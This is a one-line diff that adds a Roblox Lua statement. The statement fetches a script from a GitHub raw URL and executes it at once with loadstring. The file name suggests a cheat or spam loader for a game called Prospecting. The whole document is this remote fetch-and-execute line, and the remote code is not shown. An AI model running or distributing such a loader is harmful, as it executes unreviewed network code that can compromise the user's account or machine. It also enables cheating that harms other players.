@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/prospecting-spam2-0inegu2zo3lrgo.lua"))()
